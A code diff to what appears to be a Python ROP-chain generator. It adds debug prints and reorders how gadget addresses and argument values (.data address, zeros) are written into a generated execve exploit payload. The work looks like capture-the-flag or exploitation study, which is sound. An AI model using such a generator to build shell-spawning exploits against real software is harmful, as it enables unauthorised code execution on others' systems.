@@ -254,6 +254,8 @@ def case2(GadgetList, data_section_addr) :
     movGadget = movpopGadgets[0][0]
     popGadget1 = movpopGadgets[1][0]
     popGadget2 = movpopGadgets[2][0]
+    print("\n\n\n--------------------\n\n\n")
+    print(movGadget, popGadget1, popGadget2)
 
     print("\n\n\npopGadget2\n\n\n")
     print(popGadget2)
@@ -300,7 +302,7 @@ def case2(GadgetList, data_section_addr) :
 
     # rax <- 59
     raxList = categorize.queryGadgets(GadgetList, general.LOADCONSTG, "rax")
-    # print(raxList)
+    print(raxList)
 
     # Search for "pop rax; ret"
     x = 0
@@ -348,6 +350,7 @@ def case2(GadgetList, data_section_addr) :
 
             # Update payload
             payload += struct.pack("<Q", int(inst['address']))
+            print("\n\n\nRAX = ", inst)
 
             # Write it into the file
             fd.write("payload += struct.pack('<Q', ")
@@ -355,6 +358,8 @@ def case2(GadgetList, data_section_addr) :
             fd.write(")")
             fd.write("\t\t# Address of 'xor rax, rax; ret'")
             fd.write("\n\t")
+
+            print("\n\n\nxor rax, rax; ret: ", inst)
 
             if changeRegValue(GadgetList, "rax", 0, 59, payload, fd) == 0: 
                 print("Unable to find gadgets which can change rax's value")
@@ -395,16 +400,17 @@ def case2(GadgetList, data_section_addr) :
 
             # Write it into the file
             fd.write("payload += struct.pack('<Q', ")
-            fd.write(hex(data_section_addr))
-            fd.write(")")
-            fd.write("\t\t# Address of .data section")
-            fd.write("\n\t")
-
-            fd.write("payload += struct.pack('<Q', ")
             fd.write(hex(int(inst['address'])))
             fd.write(")")
             fd.write("\t\t# Address of pop rsi; ret")
             fd.write("\n\t")
+            
+            fd.write("payload += struct.pack('<Q', ")
+            fd.write("0")
+            fd.write(")")
+            fd.write("\n\t")
+
+           
             break
         x = x + 1
 
@@ -429,12 +435,17 @@ def case2(GadgetList, data_section_addr) :
                 
 
             # Write it into the file
-            fd.write("payload += struct.pack('<Q', 0)")
-            fd.write("\n\t")
+           
             fd.write("payload += struct.pack('<Q', ")
             fd.write(hex(int(inst['address'])))
             fd.write(")")
             fd.write("\t\t# Address of pop rdi; ret")
+            fd.write("\n\t")
+
+            fd.write("payload += struct.pack('<Q', ")
+            fd.write(hex(data_section_addr))
+            fd.write(")")
+            fd.write("\t\t# Address of .data section")
             fd.write("\n\t")
             break
         x = x + 1
@@ -458,13 +469,16 @@ def case2(GadgetList, data_section_addr) :
                 
 
             # Write it into the file
-            fd.write("payload += struct.pack('<Q', 0)")
-            fd.write("\n\t")
+           
             fd.write("payload += struct.pack('<Q', ")
             fd.write(hex(int(inst['address'])))
             fd.write(")")
             fd.write("\t\t# Address of pop rdx; ret")
             fd.write("\n\t")
+           
+            fd.write("payload += struct.pack('<Q', 0)")
+            fd.write("\n\t")
+           
             break
         x = x + 1
 
@@ -573,6 +587,8 @@ def changeRegValue(GadgetList, Reg, CurrentValue, FinalValue, payload, fd) :
         inst = gadget[0]
 
         if inst['mnemonic'] == "add" : 
+
+            print("\n\n\nadd rax, 1; ret", inst)
 
             if inst['operands'][0].isnumeric() : 
                 const = int(inst['operands'][0])
@@ -718,7 +734,7 @@ def writeHeader(fd) :
     fd.write("\n\n\t")
     fd.write("# Enter the amount of junk required")
     fd.write("\n\t")
-    fd.write("\tpayload = ''")
+    fd.write("payload = ''")
     fd.write("\n\n\t")
 
     
